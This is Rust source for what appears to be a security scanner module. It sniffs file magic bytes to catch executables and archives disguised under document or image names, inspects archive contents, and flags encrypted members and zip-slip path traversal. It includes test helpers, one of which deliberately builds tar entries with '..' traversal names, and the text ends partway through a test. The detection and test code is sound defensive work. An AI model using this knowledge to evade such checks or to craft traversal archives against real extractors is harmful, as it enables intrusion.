//! Concealed executables and bundled archives (`ARTIFACT-004` .. `ARTIFACT-011`).
//!
//! Regex packs read text. These checks read *what a file is* — its magic
//! bytes — and compare that with what its name claims, then open the archives
//! a tree carries so the text inside them reaches the same content phases as
//! every other file.
//!
//! | Rule | Severity | Shape |
//! |---|---|---|
//! | `ARTIFACT-004` | Critical, corroborate | Native or VM executable (ELF, PE, Mach-O, Java class, WASM) under a document, text or image extension |
//! | `ARTIFACT-005` | High | Archive or script under a document, text or image extension |
//! | `ARTIFACT-006` | High | Native executable in a hidden file or directory |
//! | `ARTIFACT-007` | Low | Archive shipped in the tree (inspected; the observation says what was inside) |
//! | `ARTIFACT-008` | Medium | Archive that could not be fully inspected (caps, corruption, unsupported format, nesting deeper than two) |
//! | `ARTIFACT-009` | High | Encrypted (password-protected) archive member |
//! | `ARTIFACT-010` | High | Archive member path or link target escapes the extraction root (zip-slip) |
//! | `ARTIFACT-011` | High | Executable or bytecode inside an archive |
//!
//! Archive members are never written to disk. Text members come back as
//! [`VirtualFile`]s named `outer.zip!/path/in/zip`, which `run_scan` feeds
//! through the normal per-file pipeline, so a payload parked in a bundled zip
//! is found by the rule that would have found it in the open.

use std::io::{Cursor, Read, Seek};
use std::path::{Path, PathBuf};

use super::bytecode::{finding, VirtualFile};
use super::{Evidence, Finding, Phase, Severity};

pub const RULE_DISGUISED_EXECUTABLE: &str = "ARTIFACT-004";
pub const RULE_DISGUISED_ARCHIVE: &str = "ARTIFACT-005";
pub const RULE_HIDDEN_EXECUTABLE: &str = "ARTIFACT-006";
pub const RULE_ARCHIVE: &str = "ARTIFACT-007";
pub const RULE_ARCHIVE_INCOMPLETE: &str = "ARTIFACT-008";
pub const RULE_ARCHIVE_ENCRYPTED: &str = "ARTIFACT-009";
pub const RULE_ARCHIVE_TRAVERSAL: &str = "ARTIFACT-010";
pub const RULE_ARCHIVE_EXECUTABLE: &str = "ARTIFACT-011";

/// Bytes of each file read to identify it: enough for the tar magic at 257
/// and a PE header behind a normal-sized DOS stub.
const HEAD_BYTES: usize = 4096;

/// Nesting: an archive inside the tree is depth 1, an archive inside that is
/// depth 2, and anything deeper is reported rather than opened.
const MAX_DEPTH: usize = 2;
/// Members looked at per archive.
const MAX_MEMBERS_PER_ARCHIVE: usize = 2_000;
/// Members looked at across the whole scan.
const MAX_MEMBERS_TOTAL: usize = 10_000;
/// Decompressed bytes read from any one member. Read through `take`, so a
/// header that lies about the size cannot push past it.
const MAX_MEMBER_BYTES: u64 = 4 * 1024 * 1024;
/// Decompressed bytes read across the whole scan.
const MAX_TOTAL_BYTES: u64 = 128 * 1024 * 1024;
/// Text retained for the content phases across the whole scan.
const MAX_RETAINED_TEXT: usize = 32 * 1024 * 1024;
/// Bytes of members the content phases do not read (binaries, document XML)
/// retained for YARA rules across the whole scan, when any are loaded. A
/// separate cap, so loading YARA rules never costs text members their scan.
const MAX_RETAINED_RAW: usize = 32 * 1024 * 1024;

/// Label of an archive member kept only for the byte-level YARA pass.
pub const RAW_MEMBER_LABEL: &str = "archive member (raw bytes)";

/// What a file's leading bytes say it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Magic {
    Elf,
    Pe,
    MachO,
    JavaClass,
    Wasm,
    /// Android DEX or Lua bytecode.
    VmBytecode,
    Zip,
    Gzip,
    Tar,
    SevenZip,
    Rar,
    Bzip2,
    Xz,
    Shebang,
    Unknown,
}

impl Magic {
    fn is_executable(self) -> bool {
        matches!(
            self,
            Magic::Elf
                | Magic::Pe
                | Magic::MachO
                | Magic::JavaClass
                | Magic::Wasm
                | Magic::VmBytecode
        )
    }
    fn is_archive(self) -> bool {
        matches!(
            self,
            Magic::Zip
                | Magic::Gzip
                | Magic::Tar
                | Magic::SevenZip
                | Magic::Rar
                | Magic::Bzip2
                | Magic::Xz
        )
    }
    fn label(self) -> &'static str {
        match self {
            Magic::Elf => "ELF executable",
            Magic::Pe => "Windows PE executable",
            Magic::MachO => "Mach-O executable",
            Magic::JavaClass => "Java class file",
            Magic::Wasm => "WebAssembly module",
            Magic::VmBytecode => "DEX/Lua bytecode",
            Magic::Zip => "zip archive",
            Magic::Gzip => "gzip stream",
            Magic::Tar => "tar archive",
            Magic::SevenZip => "7-Zip archive",
            Magic::Rar => "RAR archive",
            Magic::Bzip2 => "bzip2 stream",
            Magic::Xz => "xz stream",
            Magic::Shebang => "script (#! interpreter line)",
            Magic::Unknown => "unknown",
        }
    }
}

/// Identify a file from its first bytes.
pub fn sniff(head: &[u8]) -> Magic {
    let starts = |m: &[u8]| head.starts_with(m);
    if starts(b"\x7fELF") {
        return Magic::Elf;
    }
    if starts(b"MZ") && head.len() >= 0x40 {
        let e_lfanew =
            u32::from_le_bytes([head[0x3c], head[0x3d], head[0x3e], head[0x3f]]) as usize;
        if head.get(e_lfanew..e_lfanew + 4) == Some(b"PE\0\0") {
            return Magic::Pe;
        }
        // A DOS stub whose PE header lies past what was read still has the
        // zero-filled DOS header; text never does.
        if head[2..0x40].contains(&0) && e_lfanew >= 0x40 {
            return Magic::Pe;
        }
    }
    for m in [
        b"\xfe\xed\xfa\xce",
        b"\xfe\xed\xfa\xcf",
        b"\xce\xfa\xed\xfe",
        b"\xcf\xfa\xed\xfe",
    ] {
        if starts(m) {
            return Magic::MachO;
        }
    }
    if starts(b"\xca\xfe\xba\xbe") && head.len() >= 8 {
        // Java class and fat Mach-O share this magic; the next word tells
        // them apart (class-file major version vs a small arch count).
        let major = u16::from_be_bytes([head[6], head[7]]);
        let nfat = u32::from_be_bytes([head[4], head[5], head[6], head[7]]);
        if (45..=80).contains(&major) {
            return Magic::JavaClass;
        }
        if (1..=30).contains(&nfat) {
            return Magic::MachO;
        }
    }
    if starts(b"\0asm\x01\0\0\0") {
        return Magic::Wasm;
    }
    // DEX: `dex\n` + three version digits + NUL. Lua: ESC `Lua` + version.
    // Both are exact enough that prose starting with "dex" never matches.
    if (head.len() >= 8
        && starts(b"dex\n")
        && head[4..7].iter().all(u8::is_ascii_digit)
        && head[7] == 0)
        || (starts(b"\x1bLua") && head.len() >= 5 && (0x50..=0x55).contains(&head[4]))
    {
        return Magic::VmBytecode;
    }
    if starts(b"PK\x03\x04") || starts(b"PK\x05\x06") || starts(b"PK\x07\x08") {
        return Magic::Zip;
    }
    if starts(b"\x1f\x8b\x08") {
        return Magic::Gzip;
    }
    if head.get(257..262) == Some(b"ustar") {
        return Magic::Tar;
    }
    if starts(b"7z\xbc\xaf\x27\x1c") {
        return Magic::SevenZip;
    }
    if starts(b"Rar!\x1a\x07") {
        return Magic::Rar;
    }
    if starts(b"BZh") && head.get(4..10) == Some(b"\x31\x41\x59\x26\x53\x59") {
        return Magic::Bzip2;
    }
    if starts(b"\xfd7zXZ\0") {
        return Magic::Xz;
    }
    if starts(b"#!") {
        return Magic::Shebang;
    }
    Magic::Unknown
}

/// What a file's name claims it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Claim {
    /// Human-readable text: markdown, data, config, markup.
    Text,
    /// A document format that is binary but never executable.
    Document,
    /// An image, audio, video or font.
    Media,
    /// A document format whose container *is* a zip (docx, xlsx, epub...).
    ZipDocument,
    /// Anything else, including real binaries and archives.
    Other,
}

fn claim_for(name: &str) -> Claim {
    let lower = name.to_ascii_lowercase();
    let base = lower.rsplit('/').next().unwrap_or(&lower);
    let ext = base.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    match ext {
        "md" | "markdown" | "mdx" | "mdc" | "txt" | "rst" | "adoc" | "json" | "jsonl" | "yaml"
        | "yml" | "toml" | "ini" | "cfg" | "conf" | "csv" | "tsv" | "xml" | "html" | "htm"
        | "css" | "svg" | "log" => Claim::Text,
        "pdf" | "doc" | "xls" | "ppt" | "rtf" => Claim::Document,
        "docx" | "xlsx" | "pptx" | "docm" | "xlsm" | "pptm" | "odt" | "ods" | "odp" | "epub" => {
            Claim::ZipDocument
        }
        "png" | "jpg" | "jpeg" | "gif" | "bmp" | "ico" | "webp" | "tif" | "tiff" | "heic"
        | "avif" | "mp3" | "mp4" | "wav" | "ogg" | "flac" | "m4a" | "mov" | "avi" | "mkv"
        | "webm" | "ttf" | "otf" | "woff" | "woff2" | "eot" | "psd" => Claim::Media,
        "" => {
            // Extensionless files named like documentation.
            if matches!(
                base,
                "readme" | "license" | "licence" | "copying" | "notice" | "changelog" | "authors"
            ) {
                Claim::Text
            } else {
                Claim::Other
            }
        }
        _ => Claim::Other,
    }
}

/// Containers whose members are expected to be executable (class files in a
/// jar). Their members are still read for text, but executables inside are
/// what they are for, and PROV-002 already reports the container.
fn is_executable_container(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        ".jar", ".war", ".ear", ".aar", ".apk", ".nupkg", ".vsix", ".xpi", ".crx",
    ]
    .iter()
    .any(|e| lower.ends_with(e))
}

/// Member names that run: scripts, programs, and Office macro projects.
fn is_runnable_name(lower: &str) -> bool {
    let base = lower.rsplit('/').next().unwrap_or(lower);
    if base == "vbaproject.bin" {
        return true;
    }
    let ext = base.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    matches!(
        ext,
        "sh" | "bash"
            | "zsh"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "vbs"
            | "vbe"
            | "js"
            | "jse"
            | "wsf"
            | "hta"
            | "py"
            | "rb"
            | "pl"
            | "exe"
            | "dll"
            | "scr"
            | "msi"
            | "lnk"
            | "so"
            | "dylib"
            | "command"
            | "applescript"
    )
}

fn in_hidden_path(rel: &str) -> bool {
    rel.split('/')
        .any(|seg| seg.starts_with('.') && seg != "." && seg != "..")
}

/// A member path or link target that leaves the extraction root.
pub fn escapes_root(name: &str) -> bool {
    let n = name.replace('\\', "/");
    if n.starts_with('/') {
        return true;
    }
    let b = n.as_bytes();
    if b.len() >= 2 && b[1] == b':' && b[0].is_ascii_alphabetic() {
        return true;
    }
    let mut depth: i64 = 0;
    for seg in n.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return true;
                }
            }
            _ => depth += 1,
        }
    }
    false
}

/// macOS resource-fork metadata that `zip` on a Mac adds beside every file.
fn is_appledouble(name: &str) -> bool {
    name.starts_with("__MACOSX/")
        || name.rsplit('/').next().is_some_and(|b| b.starts_with("._"))
        || name.ends_with(".DS_Store")
}

/// Everything the tree pass found.
#[derive(Debug, Default)]
pub struct ArtifactScan {
    pub findings: Vec<Finding>,
    /// Text members of archives, for the content phases (and, with
    /// `keep_raw`, the members they do not read, for YARA rules).
    pub units: Vec<VirtualFile>,
}

/// Shared caps across every archive in one scan.
struct Budget {
    members: usize,
    bytes: u64,
    retained: usize,
    /// Keep members the content phases skip, for YARA rules.
    keep_raw: bool,
    retained_raw: usize,
}

impl Budget {
    fn members_left(&self) -> bool {
        self.members < MAX_MEMBERS_TOTAL
    }
}

/// What one archive held.
#[derive(Default)]
struct Tally {
    members: usize,
    text: usize,
    duplicates: usize,
    binary: usize,
    executables: Vec<String>,
    encrypted: Vec<String>,
    escapes: Vec<String>,
    incomplete: Vec<String>,
    /// Members larger than the per-member cap, scanned from their head.
    partial: usize,
}

fn read_head(path: &Path) -> Option<Vec<u8>> {
    let mut f = std::fs::File::open(path).ok()?;
    let mut buf = vec![0u8; HEAD_BYTES];
    let mut filled = 0;
    while filled < buf.len() {
        match f.read(&mut buf[filled..]) {
            Ok(0) => break,
            Ok(n) => filled += n,
            Err(_) => return None,
        }
    }
    buf.truncate(filled);
    Some(buf)
}

/// Run the magic and archive checks over the walked files.
#[allow(dead_code)]
pub fn scan(strip_base: &Path, files: &[PathBuf]) -> ArtifactScan {
    scan_with(strip_base, files, false)
}

/// [`scan`]; with `keep_raw`, archive members the content phases do not
/// read (executables, binary data, document XML) are also returned, with
/// their bytes, for YARA rules to evaluate.
pub fn scan_with(strip_base: &Path, files: &[PathBuf], keep_raw: bool) -> ArtifactScan {
    let mut out = ArtifactScan::default();
    let mut budget = Budget {
        members: 0,
        bytes: 0,
        retained: 0,
        keep_raw,
        retained_raw: 0,
    };
    for path in files {
        let rel = path
            .strip_prefix(strip_base)
            .unwrap_or(path)
            .to_string_lossy()
            .replace('\\', "/");
        if rel.starts_with(".git/") {
            continue;
        }
        let Some(head) = read_head(path) else {
            continue;
        };
        if head.len() < 4 {
            continue;
        }
        let magic = sniff(&head);
        if magic == Magic::Unknown {
            continue;
        }
        let claim = claim_for(&rel);

        if magic.is_executable()
            && matches!(
                claim,
                Claim::Text | Claim::Document | Claim::Media | Claim::ZipDocument
            )
        {
            out.findings.push(finding(
                Phase::Obfuscation,
                RULE_DISGUISED_EXECUTABLE,
                Severity::Critical,
                &rel,
                format!(
                    "{} disguised under a document/image name — the extension claims \
                     non-executable content but the file is machine code",
                    magic.label()
                ),
                5,
                Evidence::Corroborate,
            ));
        } else if magic.is_executable() && in_hidden_path(&rel) {
            out.findings.push(finding(
                Phase::Obfuscation,
                RULE_HIDDEN_EXECUTABLE,
                Severity::High,
                &rel,
                format!(
                    "{} inside a hidden file or directory — out of sight in a normal \
                     listing and not reviewable as source",
                    magic.label()
                ),
                5,
                Evidence::Standalone,
            ));
        }

        let disguised_archive = (magic.is_archive()
            && matches!(claim, Claim::Text | Claim::Document | Claim::Media))
            || (magic == Magic::Shebang && matches!(claim, Claim::Document | Claim::Media));
        if disguised_archive {
            out.findings.push(finding(
                Phase::Obfuscation,
                RULE_DISGUISED_ARCHIVE,
                Severity::High,
                &rel,
                format!(
                    "{} disguised under a document/image name — the file is not what its \
                     extension says",
                    magic.label()
                ),
                5,
                Evidence::Standalone,
            ));
        }

        if magic.is_archive() {
            inspect_on_disk(path, &rel, magic, claim, &mut budget, &mut out);
        }
    }
    out
}

fn inspect_on_disk(
    path: &Path,
    rel: &str,
    magic: Magic,
    claim: Claim,
    budget: &mut Budget,
    out: &mut ArtifactScan,
) {
    let mut tally = Tally::default();
    let sibling_root = path.parent().map(Path::to_path_buf);
    let office = claim == Claim::ZipDocument;
    match magic {
        Magic::Zip => match std::fs::File::open(path) {
            Ok(f) => walk_zip(
                f,
                rel,
                1,
                office,
                sibling_root.as_deref(),
                budget,
                &mut tally,
                out,
            ),
            Err(e) => tally.incomplete.push(format!("could not open: {e}")),
        },
        Magic::Gzip | Magic::Tar => match std::fs::File::open(path) {
            Ok(f) => walk_stream(
                f,
                magic,
                rel,
                1,
                sibling_root.as_deref(),
                budget,
                &mut tally,
                out,
            ),
            Err(e) => tally.incomplete.push(format!("could not open: {e}")),
        },
        other => tally
            .incomplete
            .push(format!("{} contents are not inspected", other.label())),
    }
    report(rel, magic, office, tally, out);
}

/// Findings for one archive, from its tally.
fn report(display: &str, magic: Magic, office: bool, tally: Tally, out: &mut ArtifactScan) {
    let sample = |v: &[String]| -> String {
        let shown: Vec<&str> = v.iter().take(3).map(String::as_str).collect();
        let more = if v.len() > shown.len() {
            format!(", +{} more", v.len() - shown.len())
        } else {
            String::new()
        };
        format!("{}{more}", shown.join(", "))
    };
    // An office document is a zip by design; it is only worth a line when
    // something inside it is not document content.
    if !office {
        out.findings.push(finding(
            Phase::Provenance,
            RULE_ARCHIVE,
            Severity::Low,
            display,
            format!(
                "{} shipped in the tree: {} member(s) inspected — {} text member(s) scanned{}, \
                 {} identical to files already scanned, {} binary",
                magic.label(),
                tally.members,
                tally.text,
                if tally.partial > 0 {
                    format!(
                        " ({} larger than {} MB, scanned from the head)",
                        tally.partial,
                        MAX_MEMBER_BYTES / (1024 * 1024)
                    )
                } else {
                    String::new()
                },
                tally.duplicates,
                tally.binary
            ),
            1,
            Evidence::Standalone,
        ));
    }
    if !tally.executables.is_empty() {
        out.findings.push(finding(
            Phase::Obfuscation,
            RULE_ARCHIVE_EXECUTABLE,
            Severity::High,
            display,
            format!(
                "Archive carries {} executable or bytecode member(s): {} — code packed \
                 where a reviewer does not look",
                tally.executables.len(),
                sample(&tally.executables)
            ),
            5,
            Evidence::Standalone,
        ));
    }
    if !tally.encrypted.is_empty() {
        out.findings.push(finding(
            Phase::Obfuscation,
            RULE_ARCHIVE_ENCRYPTED,
            Severity::High,
            display,
            format!(
                "Password-protected archive member(s) cannot be inspected: {}",
                sample(&tally.encrypted)
            ),
            5,
            Evidence::Standalone,
        ));
    }
    if !tally.escapes.is_empty() {
        out.findings.push(finding(
            Phase::Provenance,
            RULE_ARCHIVE_TRAVERSAL,
            Severity::High,
            display,
            format!(
                "Archive member path or link escapes the extraction root (zip-slip): {}",
                sample(&tally.escapes)
            ),
            5,
            Evidence::Standalone,
        ));
    }
    if !tally.incomplete.is_empty() {
        out.findings.push(finding(
            Phase::Provenance,
            RULE_ARCHIVE_INCOMPLETE,
            Severity::Medium,
            display,
            format!(
                "Archive was not fully inspected: {}",
                sample(&tally.incomplete)
            ),
            2,
            Evidence::Standalone,
        ));
    }
}

#[allow(clippy::too_many_arguments)]
fn walk_zip<R: Read + Seek>(
    reader: R,
    display: &str,
    depth: usize,
    office: bool,
    sibling_root: Option<&Path>,
    budget: &mut Budget,
    tally: &mut Tally,
    out: &mut ArtifactScan,
) {
    let mut archive = match zip::ZipArchive::new(reader) {
        Ok(a) => a,
        Err(e) => {
            tally.incomplete.push(format!("zip could not be read: {e}"));
            return;
        }
    };
    let container_is_exec = is_executable_container(display);
    // OOXML and ODF/EPUB say what they are from the inside, whatever the
    // file is called: `.instructions.docx.txt` is still a Word document.
    let office = office
        || archive
            .file_names()
            .any(|n| n == "[Content_Types].xml" || n == "mimetype");
    for i in 0..archive.len() {
        if i >= MAX_MEMBERS_PER_ARCHIVE || !budget.members_left() {
            tally
                .incomplete
                .push(format!("member cap reached after {i} of {}", archive.len()));
            break;
        }
        if budget.bytes >= MAX_TOTAL_BYTES {
            tally
                .incomplete
                .push("decompressed-byte cap reached".into());
            break;
        }
        let (name, is_dir, is_symlink) = match archive.by_index_raw(i) {
            Ok(f) => (
                f.name().to_string(),
                f.is_dir(),
                f.unix_mode().is_some_and(|m| m & 0o170000 == 0o120000),
            ),
            Err(e) => {
                tally.incomplete.push(format!("entry {i}: {e}"));
                continue;
            }
        };
        budget.members += 1;
        tally.members += 1;
        if escapes_root(&name) {
            tally.escapes.push(name.clone());
        }
        if is_dir || is_appledouble(&name) {
            continue;
        }
        let bytes = match archive.by_index(i) {
            Ok(f) => {
                let mut buf = Vec::new();
                let mut limited = f.take(MAX_MEMBER_BYTES + 1);
                if let Err(e) = limited.read_to_end(&mut buf) {
                    tally.incomplete.push(format!("{name}: {e}"));
                    continue;
                }
                buf
            }
            Err(zip::result::ZipError::UnsupportedArchive(msg))
                if msg == zip::result::ZipError::PASSWORD_REQUIRED =>
            {
                tally.encrypted.push(name.clone());
                continue;
            }
            Err(e) => {
                tally.incomplete.push(format!("{name}: {e}"));
                continue;
            }
        };
        if is_symlink {
            let target = String::from_utf8_lossy(&bytes);
            if escapes_root(&link_join(&name, &target)) {
                tally.escapes.push(format!("{name} -> {target}"));
            }
            continue;
        }
        member(
            &name,
            bytes,
            display,
            "zip",
            depth,
            office,
            container_is_exec,
            sibling_root,
            budget,
            tally,
            out,
        );
    }
}

/// A link target resolved against the directory of the link itself.
fn link_join(link: &str, target: &str) -> String {
    if target.starts_with('/') {
        return target.to_string();
    }
    match link.rsplit_once('/') {
        Some((dir, _)) => format!("{dir}/{target}"),
        None => target.to_string(),
    }
}

/// Read a gzip or tar stream. A gzip that does not hold a tar is a single
/// compressed file and is scanned as one member.
#[allow(clippy::too_many_arguments)]
fn walk_stream<R: Read>(
    reader: R,
    magic: Magic,
    display: &str,
    depth: usize,
    sibling_root: Option<&Path>,
    budget: &mut Budget,
    tally: &mut Tally,
    out: &mut ArtifactScan,
) {
    if magic == Magic::Tar {
        walk_tar(reader, display, depth, sibling_root, budget, tally, out);
        return;
    }
    // Decompress up to the per-member cap to see what the stream holds.
    let remaining = MAX_TOTAL_BYTES.saturating_sub(budget.bytes);
    let gz = flate2::read::GzDecoder::new(reader);
    let mut peek = Vec::new();
    let mut limited = gz.take(HEAD_BYTES as u64);
    if let Err(e) = limited.read_to_end(&mut peek) {
        tally
            .incomplete
            .push(format!("gzip could not be read: {e}"));
        return;
    }
    let rest = limited.into_inner();
    let chained = Cursor::new(peek.clone()).chain(rest);
    if sniff(&peek) == Magic::Tar {
        walk_tar(
            chained.take(remaining),
            display,
            depth,
            sibling_root,
            budget,
            tally,
            out,
        );
        return;
    }
    let mut buf = Vec::new();
    if let Err(e) = chained.take(MAX_MEMBER_BYTES + 1).read_to_end(&mut buf) {
        tally
            .incomplete
            .push(format!("gzip could not be read: {e}"));
        return;
    }
    budget.members += 1;
    tally.members += 1;
    let inner = display
        .rsplit('/')
        .next()
        .unwrap_or(display)
        .trim_end_matches(".gz")
        .trim_end_matches(".GZ")
        .to_string();
    member(
        &inner,
        buf,
        display,
        "gzip",
        depth,
        false,
        false,
        sibling_root,
        budget,
        tally,
        out,
    );
}

fn walk_tar<R: Read>(
    reader: R,
    display: &str,
    depth: usize,
    sibling_root: Option<&Path>,
    budget: &mut Budget,
    tally: &mut Tally,
    out: &mut ArtifactScan,
) {
    let mut archive = tar::Archive::new(reader);
    let entries = match archive.entries() {
        Ok(e) => e,
        Err(e) => {
            tally.incomplete.push(format!("tar could not be read: {e}"));
            return;
        }
    };
    for (i, entry) in entries.enumerate() {
        if i >= MAX_MEMBERS_PER_ARCHIVE || !budget.members_left() {
            tally
                .incomplete
                .push(format!("member cap reached after {i}"));
            break;
        }
        if budget.bytes >= MAX_TOTAL_BYTES {
            tally
                .incomplete
                .push("decompressed-byte cap reached".into());
            break;
        }
        let mut entry = match entry {
            Ok(e) => e,
            Err(e) => {
                tally.incomplete.push(format!("tar entry {i}: {e}"));
                break;
            }
        };
        let name = String::from_utf8_lossy(&entry.path_bytes()).into_owned();
        budget.members += 1;
        tally.members += 1;
        if escapes_root(&name) {
            tally.escapes.push(name.clone());
        }
        let kind = entry.header().entry_type();
        if kind.is_symlink() || kind.is_hard_link() {
            if let Some(target) = entry.link_name_bytes() {
                let target = String::from_utf8_lossy(&target).into_owned();
                let resolved = if kind.is_hard_link() {
                    target.clone()
                } else {
                    link_join(&name, &target)
                };
                if escapes_root(&resolved) {
                    tally.escapes.push(format!("{name} -> {target}"));
                }
            }
            continue;
        }
        if !kind.is_file() || is_appledouble(&name) {
            continue;
        }
        let mut buf = Vec::new();
        if let Err(e) = (&mut entry)
            .take(MAX_MEMBER_BYTES + 1)
            .read_to_end(&mut buf)
        {
            tally.incomplete.push(format!("{name}: {e}"));
            break;
        }
        member(
            &name,
            buf,
            display,
            "tar",
            depth,
            false,
            false,
            sibling_root,
            budget,
            tally,
            out,
        );
    }
}

/// Classify one member's bytes: recurse into a nested archive, count an
/// executable, or keep text for the content phases.
#[allow(clippy::too_many_arguments)]
fn member(
    name: &str,
    mut bytes: Vec<u8>,
    outer: &str,
    scheme: &str,
    depth: usize,
    office: bool,
    container_is_exec: bool,
    sibling_root: Option<&Path>,
    budget: &mut Budget,
    tally: &mut Tally,
    out: &mut ArtifactScan,
) {
    budget.bytes = budget.bytes.saturating_add(bytes.len() as u64);
    let display = format!("{outer}!/{name}");
    // An oversized text member is scanned in part, the way the main walk
    // scans an oversized file: noted in the observation, not a finding of
    // its own. An oversized nested archive cannot be opened from its head
    // and is reported as not inspected below.
    let truncated = bytes.len() as u64 > MAX_MEMBER_BYTES;
    if truncated {
        bytes.truncate(MAX_MEMBER_BYTES as usize);
        tally.partial += 1;
    }
    let magic = sniff(&bytes[..bytes.len().min(HEAD_BYTES)]);
    let lower = name.to_ascii_lowercase();

    if magic.is_archive() {
        tally.binary += 1;
        if depth >= MAX_DEPTH {
            tally.incomplete.push(format!(
                "{name}: nested archive deeper than {MAX_DEPTH} levels"
            ));
            return;
        }
        let mut inner = Tally::default();
        let inner_office = claim_for(name) == Claim::ZipDocument;
        match magic {
            // Members of an archive inside a document are still inside the
            // document, so they inherit its expectations.
            Magic::Zip if !truncated => walk_zip(
                Cursor::new(bytes),
                &display,
                depth + 1,
                office || inner_office,
                None,
                budget,
                &mut inner,
                out,
            ),
            Magic::Gzip | Magic::Tar if !truncated => walk_stream(
                Cursor::new(bytes),
                magic,
                &display,
                depth + 1,
                None,
                budget,
                &mut inner,
                out,
            ),
            _ if truncated => inner.incomplete.push(format!(
                "nested {} larger than {} MB; contents not inspected",
                magic.label(),
                MAX_MEMBER_BYTES / (1024 * 1024)
            )),
            _ => inner
                .incomplete
                .push(format!("{} contents are not inspected", magic.label())),
        }
        report(&display, magic, inner_office, inner, out);
        return;
    }
    if magic.is_executable() || lower.ends_with(".pyc") || lower.ends_with(".pyo") {
        tally.binary += 1;
        if !container_is_exec {
            tally.executables.push(name.to_string());
        }
        keep_raw(
            name,
            bytes,
            truncated,
            &display,
            outer,
            scheme,
            sibling_root,
            budget,
            tally,
            out,
        );
        return;
    }
    // Inside a document, anything that runs is out of place: a script, a
    // program, or a VBA macro project.
    let runs_inside_document = office && is_runnable_name(&lower);
    if runs_inside_document {
        tally.executables.push(name.to_string());
    }
    if bytes.contains(&0) {
        tally.binary += 1;
        keep_raw(
            name,
            bytes,
            truncated,
            &display,
            outer,
            scheme,
            sibling_root,
            budget,
            tally,
            out,
        );
        return;
    }
    if office && !runs_inside_document {
        // Document XML is not something the content rules read well, and the
        // document itself is not code.
        keep_raw(
            name,
            bytes,
            truncated,
            &display,
            outer,
            scheme,
            sibling_root,
            budget,
            tally,
            out,
        );
        return;
    }
    // The common benign shape is a zip of the skill sitting beside the skill:
    // members byte-identical to files already on disk were scanned once.
    if let Some(root) = sibling_root {
        if !escapes_root(name) {
            if let Ok(existing) = std::fs::read(root.join(name)) {
                if existing == bytes {
                    tally.duplicates += 1;
                    return;
                }
            }
        }
    }
    if budget.retained + bytes.len() > MAX_RETAINED_TEXT {
        tally
            .incomplete
            .push(format!("{name}: retained-text cap reached, not scanned"));
        return;
    }
    budget.retained += bytes.len();
    tally.text += 1;
    // Valid UTF-8 is kept once, as the text; anything else is shown to the
    // content phases lossily, and its exact bytes are kept for YARA rules.
    let (text, raw) = match String::from_utf8(bytes) {
        Ok(text) => (text, None),
        Err(e) => {
            let text = String::from_utf8_lossy(e.as_bytes()).into_owned();
            (text, budget.keep_raw.then(|| e.into_bytes()))
        }
    };
    out.units.push(VirtualFile {
        rel_path: display.clone(),
        text,
        locator: format!("{scheme}://{outer}|{name}"),
        label: "archive member",
        raw,
        is_file: true,
        truncated,
    });
}

/// With YARA rules loaded, keep a member the content phases do not read, so
/// the byte-level pass still sees it. Past the cap the archive is reported
/// as not fully inspected rather than silently passed over.
#[allow(clippy::too_many_arguments)]
fn keep_raw(
    name: &str,
    bytes: Vec<u8>,
    truncated: bool,
    display: &str,
    outer: &str,
    scheme: &str,
    sibling_root: Option<&Path>,
    budget: &mut Budget,
    tally: &mut Tally,
    out: &mut ArtifactScan,
) {
    if !budget.keep_raw || bytes.is_empty() {
        return;
    }
    // Byte-identical to the file beside the archive: evaluated on disk.
    if let Some(root) = sibling_root {
        if !escapes_root(name) && std::fs::read(root.join(name)).is_ok_and(|b| b == bytes) {
            tally.duplicates += 1;
            return;
        }
    }
    if budget.retained_raw + bytes.len() > MAX_RETAINED_RAW {
        tally.incomplete.push(format!(
            "{name}: raw-bytes cap for YARA rules reached, not evaluated"
        ));
        return;
    }
    budget.retained_raw += bytes.len();
    out.units.push(VirtualFile {
        rel_path: display.to_string(),
        text: String::new(),
        locator: format!("{scheme}://{outer}|{name}"),
        label: RAW_MEMBER_LABEL,
        raw: Some(bytes),
        is_file: true,
        truncated,
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn zip_bytes(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = Cursor::new(Vec::new());
        {
            let mut w = zip::ZipWriter::new(&mut buf);
            let opts = zip::write::FileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);
            for (name, body) in entries {
                w.start_file(*name, opts).unwrap();
                w.write_all(body).unwrap();
            }
            w.finish().unwrap();
        }
        buf.into_inner()
    }

    fn tgz_bytes(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut b = tar::Builder::new(gz);
        for (name, body) in entries {
            let mut h = tar::Header::new_gnu();
            h.set_size(body.len() as u64);
            h.set_mode(0o644);
            h.set_entry_type(tar::EntryType::Regular);
            // `set_path` refuses `..`; write the raw name so traversal
            // entries can be built for the test.
            let raw = &mut h.as_old_mut().name;
            raw[..name.len()].copy_from_slice(name.as_bytes());
            h.set_cksum();
            b.append(&h, *body).unwrap();
        }
        b.into_inner().unwrap().finish().unwrap()
    }

    fn elf() -> Vec<u8> {
        let mut v = b"\x7fELF\x02\x01\x01\0".to_vec();
        v.resize(64, 0);
        v
    }

    fn tree(entries: &[(&str, Vec<u8>)]) -> (tempfile::TempDir, Vec<PathBuf>) {
        let d = tempfile::tempdir().unwrap();
        let mut files = Vec::new();
        for (rel, body) in entries {
            let p = d.path().join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, body).unwrap();
            files.push(p);
        }
        files.sort();
        (d, files)
    }

    fn rules(s: &ArtifactScan) -> Vec<&str> {
        s.findings.iter().map(|f| f.rule.as_str()).collect()
    }

    #[test]
    fn magic_identifies_formats() {
        assert_eq!(sniff(&elf()), Magic::Elf);
        let mut pe = vec![0u8; 0x100];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c] = 0x80;
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        assert_eq!(sniff(&pe), Magic::Pe);
        assert_eq!(sniff(b"\xca\xfe\xba\xbe\0\0\0\x34"), Magic::JavaClass);
